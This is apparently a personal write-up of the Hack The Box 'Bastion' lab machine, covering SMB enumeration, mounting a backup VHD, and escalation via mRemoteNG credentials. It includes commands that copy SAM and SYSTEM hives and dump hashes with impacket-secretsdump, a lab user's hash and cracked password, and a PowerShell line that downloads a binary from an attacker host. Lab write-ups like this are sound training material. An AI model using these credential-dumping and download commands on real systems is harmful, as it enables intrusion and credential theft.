# Bastion Helped-Through

Name: Bastion
Date:  
Difficulty:  Easy
Goals:  
- Guided mode
Learnt:
Beyond Root:
- https://github.com/TheSnowWight/hackdocs/tree/master learn from Cryptographic related pages

- [[Bastion-Notes.md]]
- [[Bastion-CMD-by-CMDs.md]]


## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](Screenshots/ping.png)

![](bastion-nmap.png)

![](rpcclientdenied.png)
![](r-rw-smbmap.png)
![](slowvpninnote.png)


![](smbmap-recursivelylist.png)

![](exfilnotedottext.png)

![](backupscontainpasswords.png)

The problem I then faced is the actual support pages need to do this are not easy, but also this box showcases a weird case like this. So this sort of also becomes a Helped-Through be definition 
- [VK9](https://vk9-sec.com/mount-extract-password-hashes-from-vhd-files/) Kali version
```bash
sudo apt install libguestfs-tools guestmount -y
# List
7z l $file.vhd
# Extract
7z x $file.vhd
# Create directory and mount 
sudo mkdir /mnt/vhd
ls -ld /mnt/vhd
guestmount –add file.vhd –inspector –ro -v /mnt/vhd
sudo guestmount –add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd –inspector –ro -v /mnt/vhd
cd /mnt/vhd
sudo su
cd /mnt/vhd
ls
cd /Windows/System32/config
cp SAM SYSTEM /tmp
impacket-secretsdump -sam SAM -system SYSTEM local
```

Because I only have access to the PwnBox at the moment I at least learnt how to this once I get a full setup back. From the [0xdf writeup](https://0xdf.gitlab.io/2019/09/07/htb-bastion.html) I grabbed the hash because I cannot do that part.

```
L4mpje 26112010952d963c8dc4217daec986d9 : bureaulampje
ssh L4mpje@IP
```

![](bureaulampje.png)

![](sshonbox.png)

## Privilege Escalation

```powershell
IEX(IWR http://10.10.14.51:8443/w.exe -Outfile w.exe)
```

After reading through the output knowing that both there is WinRM in some form that is unusable with `evil-winrm`, which I did try and the Guided Mode claiming there is a 'remote connection management tool'. 


```powershell
# List all 32-Bit applications
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
![](frommyarchivepesheet.png)

![](dorkingforthefile.png)

![](failed.png)

![](win.png)

![](moredetail.png)

I hate doing these, but always stumble so I will stumble along just for the learning

![](cyberc1.png)

Tried messing around with this approach from a recent THM and HTB related problem. From reading [0xdf writeup](https://0xdf.gitlab.io/2019/09/07/htb-bastion.html) there used to be a Metapsloit module that would do this also the was [mremoteng-decrypt](https://github.com/kmahyyg/mremoteng-decrypt). I think this makes me want to prepare for HTB Seasons again and find a group again. I won't paste the password in the strange chance that someone reads this.

## Post-Root-Reflection  



## Beyond Root


